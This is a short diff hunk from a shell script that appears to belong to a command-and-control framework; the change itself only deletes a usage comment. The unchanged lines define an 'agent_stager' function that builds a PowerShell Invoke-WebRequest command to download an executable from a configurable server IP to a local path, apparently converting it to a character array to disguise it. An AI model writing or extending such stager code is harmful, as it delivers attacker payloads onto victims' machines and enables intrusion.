@@ -10,7 +10,6 @@ C2_PROGRAM=server.py
 AGENT_STAGER=""
 RUNNER_STAGER=""
 # Function to convert a string to a character array
-# Usage: string_to_char_array "your string here"
 agent_stager() {
     local input_string="Invoke-WebRequest -Uri \"http://${SERVERIP}/\$executableName\" -OutFile \$outputPath -ErrorAction Stop"
     local -a char_array=() # Declare an empty array
